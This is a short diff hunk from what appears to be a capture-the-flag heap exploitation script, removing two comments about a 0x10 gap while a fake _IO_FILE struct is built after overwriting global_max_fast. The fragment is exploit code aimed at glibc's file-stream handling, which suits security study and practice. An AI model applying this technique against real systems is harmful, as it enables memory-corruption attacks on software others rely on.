@@ -90,8 +90,6 @@ e(0, flat(0, globalmaxfast-0x10))
 a(0x500, 'a') #3
 
 # build fake _IO_file struct
-# caution: this will place at heap + 0x770, while _IO_list_all = heap + 0x760.
-# we must care about this 0x10 gap
 d(1)
 payload = b''
 payload += flat(0, 0)
